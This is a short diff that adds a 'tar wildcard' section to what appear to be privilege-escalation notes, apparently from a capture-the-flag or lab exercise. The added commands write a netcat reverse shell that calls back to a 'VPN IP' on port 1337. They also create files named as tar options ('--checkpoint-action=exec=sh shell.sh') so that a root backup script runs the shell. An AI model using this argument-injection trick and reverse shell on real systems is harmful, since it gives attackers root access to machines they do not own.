@@ -213,3 +213,17 @@ drwxrwxrwt 1 root root   834 20. Feb 12:35 ..
 -rw-r--r-- 1 root root    99 20. Feb 12:33 root.c
 ```
 
+## tar wildcard
+
+```console
+$ echo "mkfifo /tmp/ahikccu; nc VPN IP 1337 0</tmp/ahikccu | /bin/sh >/tmp/ahikccu 2>&1; rm /tmp/ahikccu" > shell.sh
+$ chmod 777 shell.sh
+$ echo "" > "--checkpoint-action=exec=sh shell.sh"
+$ echo "" > --checkpoint=1
+```
+
+start nc listener
+
+```console
+$ sudo /opt/backups/backup.sh
+```
